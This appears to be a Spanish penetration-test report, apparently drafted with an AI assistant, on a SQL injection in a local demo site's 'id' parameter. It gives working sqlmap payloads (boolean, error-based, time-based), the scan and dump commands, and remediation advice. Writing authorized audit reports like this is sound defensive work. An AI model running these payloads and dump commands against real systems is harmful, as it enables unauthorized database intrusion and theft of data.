# Informe de auditoría: SQL Injection

Fecha: 2026-04-08T14:27:54Z
Objetivo: http://web.dev.local:8083
Autorización: concedida por el usuario

Resumen ejecutivo
-----------------
Se detectó una vulnerabilidad de SQL Injection en el parámetro GET "id" de la página principal (/). Se pudieron enumerar nombres de bases de datos, confirmando la explotación parcial del vector.

Detalles técnicos
-----------------
- Página objetivo: http://web.dev.local:8083
- Punto vulnerable: parámetro "id" (GET) en el formulario de búsqueda de usuario
- Tecnologías detectadas: Apache 2.4.65, PHP 8.1.33, MySQL/MariaDB
- Tipos de inyección detectados: boolean-based blind, error-based, time-based, UNION

Evidencia (resumen de sqlmap)
-----------------------------
sqlmap detectó múltiples payloads y enumeró bases de datos:
- Databases enumeradas: information_schema, mysql, performance_schema, sqli_demo, sys
- Ejemplo de payloads usados:
  - Boolean-based: id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -
  - Error-based (FLOOR/RAND concat): id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--
  - Time-based: id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)--

Acciones realizadas
-------------------
- Descubrimiento manual: curl para obtener formulario y confirmar existencia del parámetro "id".
- Escaneo automatizado: sqlmap con opciones --batch --level=5 --risk=3 --threads=5, intentó --dbs y --dump.
- Resultado: enumeración de nombres de bases de datos exitosa; sqlmap no pudo recuperar tablas ni volcados completos (problemas con técnicas UNION/limitaciones del servidor). Los hallazgos y logs se guardaron en: /home/kali_rdp/.local/share/sqlmap/output/web.dev.local

Impacto
-------
- Exposición de nombres de bases de datos (alta información sensible).
- Con acceso adicional o ajustes en la técnica, sería posible enumerar tablas y volcar datos sensibles (usuarios, credenciales, PII).

Recomendaciones
---------------
1. Usar consultas parametrizadas (prepared statements) para todas las entradas del usuario.
2. Validar y sanear estrictamente parámetros (tipado y longitud, whitelist).
3. Evitar mostrar mensajes de error SQL al usuario en producción.
4. Aplicar principio de menor privilegio a las cuentas de BD.
5. Implementar WAF y reglas específicas para detectar/mitigar inyecciones.
6. Revisar y endurecer configuración de MySQL/MariaDB y actualizar componentes obsoletos.

Estado de explotación
---------------------
- Vulnerabilidad: CONFIRMADA
- Explotación: PARCIAL. Se enumeraron bases de datos (prueba de explotación). No se obtuvieron dumps completos de tablas por limitaciones detectadas.

Pruebas reproducibles (comandos clave)
--------------------------------------
- curl -sS -L 'http://web.dev.local:8083' -o home.html
- sqlmap -u 'http://web.dev.local:8083/?id=1' --batch --level=5 --risk=3 --threads=5 --dbs
- sqlmap -u 'http://web.dev.local:8083/?id=1' --batch --level=5 --risk=3 --threads=5 -D sqli_demo --tables --dump --hex

Notas finales
-------------
Se recomienda parchear cuanto antes y realizar una segunda auditoría tras mitigaciones. Si se desea, se puede intentar técnicas avanzadas (timming, carga de UDFs, cambiar técnicas de inyección, --no-cast, --hex) para obtener volcados completos bajo autorización.

Co-authored-by: Copilot <223556219+Copilot@users.noreply.github.com>
